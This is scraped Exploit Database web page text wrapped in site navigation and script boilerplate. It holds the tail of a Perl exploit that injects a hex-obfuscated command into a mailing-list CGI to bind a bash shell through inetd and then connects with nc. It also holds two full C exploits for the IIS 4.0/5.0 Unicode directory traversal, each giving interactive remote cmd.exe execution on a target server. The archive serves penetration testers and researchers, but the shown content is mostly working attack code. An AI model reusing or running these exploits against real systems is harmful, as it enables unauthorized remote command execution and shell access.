joke!"\x65\x6d\x61\x69\x6c\x3d\x68\x61\x73\x73\x40\x2b\x26"."\x65\x63\x68\x6f\x2b\x27\x66\x69\x64\x6f\x2b\x73\x74"."\x72\x65\x61\x6d\x2b\x74\x63\x70\x2b\x6e\x6f\x77\x61"."\x69\x74\x2b\x6e\x6f\x62\x6f\x64\x79\x2b\x2f\x62\x69"."\x6e\x2f\x62\x61\x73\x68\x2b\x62\x61\x73\x68\x2b\x2d"."\x69\x27\x2b\x3e\x2b\x2f\x74\x6d\x70\x2f\x2e\x68\x61"."\x73\x73\x3b\x2f\x75\x73\x72\x2f\x73\x62\x69\x6e\x2f"."\x69\x6e\x65\x74\x64\x2b\x2f\x74\x6d\x70\x2f\x2e\x68"."\x61\x73\x73\x26\x42\x31\x3d\x4f\x4b\x26\x61\x63\x74"."\x69\x6f\x6e\x3d\x73\x75\x62\x73\x63\x72\x69\x62\x65";$cgicodeb ="subject=teleh0rz+cgi+warez&message=hass";send_code();print("\nSleeping 5 seconds - waiting for the shell ...\n\n");sleep(5); system("nc -w 10 $target 60179"); exit(0);# The sleep time may have to be longer - considering that the# maillist.cgi script has a few e-mails to send. ;)sub send_code {connect_host();send(SOCKET,"$code$cgicodea\015\012", 0)  || die("Error: $!\n");close(SOCKET); connect_host();send(SOCKET,"$code$cgicodeb\015\012", 0)  || die("Error: $!\n");close(SOCKET);}sub connect_host {$iaddr = inet_aton($target)                   || die("Error: $!\n");$paddr = sockaddr_in(80, $iaddr)              || die("Error: $!\n");$proto = getprotobyname('tcp')                || die("Error: $!\n");socket(SOCKET, PF_INET, SOCK_STREAM, $proto)  || die("Error: $!\n");connect(SOCKET, $paddr)                       || die("Error: $!\n");}# milw0rm.com [2000-11-17]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 189
Microsoft IIS 4.0/5.0 and PWS - Extended Unicode Directory Traversal (6) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft IIS 4.0/5.0 and PWS - Extended Unicode Directory Traversal (6)EDB-ID:189CVE:2000-0884EDB Verified:Author:incubusType:remoteExploit:/Platform:WindowsDate:2000-11-18Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* iisex iis exploit  (<- nost's idea) v2* --------------------------------------* Okay.. the first piece of code was not really finished.* So, i apologize to everybody..** by incubus <incubus@securax.org>** grtz to: Bio, nos, zoa, reg and vor... (who else would stay up* at night to exploit this?) to securax (#securax@efnet) - also* to kim, glyc, s0ph, tessa, lamagra and steven.*/#include <netdb.h>#include <netinet/in.h>#include <sys/types.h>#include <sys/socket.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include <errno.h>int main(int argc, char **argv){char buffy[666]; /* well, what else? I dunno how long your commands are.. */char buf[500];char rcvbuf[8192];int i, sock, result;struct sockaddr_in 	name;struct hostent 	*hostinfo;if (argc < 2){printf ("try %s www.server.com\n", argv[0]);printf ("will let you play with cmd.exe of an IIS4/5 server.\n");printf ("by incubus <incubus@securax.org>\n\n");exit(0);}printf ("\niisex - iis 4 and 5 exploit\n---------------------------\n");printf ("act like a cmd.exe kiddie, type quit to quit.\n");for (;;){printf ("\n[enter cmd> ");gets(buf);if (strstr(buf, "quit")) exit(0);i=0;while (buf[i] != '\n'){if(buf[i] == 32) buf[i] = 43;i++;}hostinfo=gethostbyname(argv[1]);if (!hostinfo){herror("Oops"); exit(-1);}name.sin_family=AF_INET; name.sin_port=htons(80);name.sin_addr=*(struct in_addr *)hostinfo->h_addr;sock=socket(AF_INET, SOCK_STREAM, 0);result=connect(sock, (struct sockaddr *)&name, sizeof(struct sockaddr_in));if (result != 0) { herror("Oops"); exit(-1); }if (sock < 0){herror("Oops"); exit(-1);}strcpy(buffy,"GET /scripts/..\%c0%af../winnt/system32/cmd.exe?/c+");strcat(buffy,buf);strcat(buffy, " HTTP/1.0\n\n");send(sock, buffy, sizeof(buffy), 0);recv(sock, rcvbuf, sizeof(rcvbuf), 0);printf ("%s", rcvbuf);close(sock);}}// milw0rm.com [2000-11-18]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 190
Microsoft IIS 4.0/5.0 and PWS - Extended Unicode Directory Traversal (9) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft IIS 4.0/5.0 and PWS - Extended Unicode Directory Traversal (9)EDB-ID:190CVE:2000-0884EDB Verified:Author:OptyxType:remoteExploit:/Platform:WindowsDate:2000-11-18Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/****************************************************************************\**                                                                          ****    Microsoft IIS 4.0/5.0 Extended UNICODE Directory Traversal Exploit    ****      proof of theory exploit cuz it's wednesday and i'm on the couch     ****                                                                          ****       brought to you by the letter B, the number 7, optyx, and t12       ****          optyx - <optyx@uberhax0r.net optyx@newhackcity.net>             ****          t12 - <t12@uberhax0r.net>                                       ****                                                                          ****     greetz go out to aempirei, a gun toatin' gangstah' hustler' player   ****     motherfucker who isn't with us anymore, miah, who's GTA2 game was    ****     was most entertaining tonight, Cathy, who provided the trippy light  ****     to stare at, and to KT, for providing me with hours of decent        ****     conversation.                                                        ****                                                                          **\****************************************************************************/#include <stdio.h>#include <netdb.h>#include <stdlib.h>#include <string.h>#include <sys/socket.h>#include <sys/types.h>#include <netinet/in.h>#include <arpa/inet.h>#include <signal.h>#include <errno.h>#include <fcntl.h>void usage(void){fprintf(stderr, "usage: ./iis-zank <-t target> <-c 'command' or -i>");fprintf(stderr, " [-p port] [-t timeout]\n");exit(-1);}int main(int argc, char **argv){int i, j;int port=80;int timeout=3;int interactive=0;char temp[1];char host[512]="";char cmd[1024]="";char request[8192]="GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+";struct hostent *he;struct sockaddr_in s_addr;printf("iis-zank_bread_chafer_8000_super_alpha_hyper_pickle.c\n");printf("by optyx and t12\n");for(i=0;i<argc;i++){ if(argv[i][0] == '-') {for(j=1;j<strlen(argv[i]);j++){switch(argv[i][j]){case 't':strncpy(host, argv[i+1], sizeof(host));break;case 'c':strncpy(cmd, argv[i+1], sizeof(cmd));break;case 'h':usage();break;case 'o':timeout=atoi(argv[i+1]);break;case 'p':port=atoi(argv[i+1]);break;case 'i':interactive=1;break;default:break;}}}}if(!strcmp(host, "")){fprintf(stderr, "specify target host\n");usage();}if(!strcmp(cmd, "") && !interactive){fprintf(stderr, "specify command to execute\n");usage();}printf("]- Target - %s:%d\n", host, port);if(!interactive)printf("]- Command - %s\n", cmd);printf("]- Timeout - %d seconds\n", timeout);if((he=gethostbyname(host)) == NULL){fprintf(stderr, "invalid target\n");usage();}do{if(interactive){cmd[0]=0;printf("\nC> ");if(fgets(cmd, sizeof(cmd), stdin) == NULL)fprintf(stderr, "gets() error\n");cmd[strlen(cmd)-1]='\0';if(!strcmp("exit", cmd))exit(-1);}for(i=0;i<strlen(cmd);i++){if(cmd[i]==' ')cmd[i]='+';}strncpy(request,"GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+",sizeof(request));strncat(request, cmd, sizeof(request) - strlen(request));strncat(request, "\n", sizeof(request) - strlen(request));s_addr.sin_family = PF_INET;s_addr.sin_port = htons(port);memcpy((char *) &s_addr.sin_addr, (char *) he->h_addr,sizeof(s_addr.sin_addr));if((i=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1){fprintf(stderr, "cannot create socket\n");exit(-1);}alarm(timeout);j = connect(i, (struct sockaddr *) &s_addr, sizeof(s_addr));alarm(0);if(j==-1){fprintf(stderr, "cannot connect to %s\n", host);exit(-1);close(i);}if(!interactive)printf("]- Sending request: %s\n", request);send(i, request, strlen(request), 0);if(!interactive)printf("]- Getting results\n");while(recv(i,temp,1, 0)>0){alarm(timeout);printf("%c", temp[0]);alarm(0);}}while(interactive);close(i);return 0;}https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/190-1.exehttps://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/190-2.obsdhttps://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/190-3.linux// milw0rm.com [2000-11-18]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + 